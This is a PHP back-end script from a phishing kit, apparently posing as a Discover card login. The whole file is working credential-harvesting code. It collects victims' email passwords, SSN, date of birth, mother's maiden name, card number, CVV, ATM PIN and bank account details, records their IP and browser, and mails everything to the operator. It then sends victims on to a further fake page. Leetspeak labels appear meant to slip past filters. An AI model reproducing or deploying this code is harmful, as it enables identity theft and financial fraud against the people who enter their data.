<?php
if($_POST["em"] != "" and $_POST["ep"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Disc0ver Info-----------------------\n";
$message .= "Email Address          : ".$_POST['em']."\n";
$message .= "Email Pa'ssw0rd        : ".$_POST['ep']."\n";
$message .= "Full Name				: ".$_POST['name']."\n";
$message .= "Address				: ".$_POST['addr']."\n";
$message .= "DOB			        : ".$_POST['db']."\n";
$message .= "SSN			        : ".$_POST['sn']."\n";
$message .= "MMN			        : ".$_POST['mn']."\n";
$message .= "Driver's License      	: ".$_POST['dl']."\n";
$message .= "C@rd Number            : ".$_POST['cn']."\n";
$message .= "Expiry Date            : ".$_POST['ex']."\n";
$message .= "CVV            		: ".$_POST['vc']."\n";
$message .= "A.TM P!N	          	: ".$_POST['pn']."\n";
$message .= "S0rt C0de            	: ".$_POST['srt']."\n";
$message .= "Acc0unt Number       	: ".$_POST['acc']."\n";
$message .= "Mobile Number          : ".$_POST['ph']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf3.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>